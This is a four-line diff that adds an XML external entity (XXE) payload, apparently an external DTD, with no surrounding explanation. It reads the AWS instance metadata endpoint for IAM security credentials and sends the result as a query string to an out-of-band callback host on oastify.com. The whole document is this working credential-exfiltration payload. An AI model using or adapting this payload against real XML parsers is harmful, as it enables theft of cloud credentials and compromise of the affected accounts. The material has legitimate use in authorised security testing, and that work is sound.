@@ -1,0 +1,4 @@
+<!ENTITY % read SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<!ENTITY % w "<!ENTITY &#x25; sendFile SYSTEM 'http://b4ggcwfofmooynzeymrs5rkkmbs5gw4l.oastify.com/?x=%read;'>">
+%w;
+%sendFile;
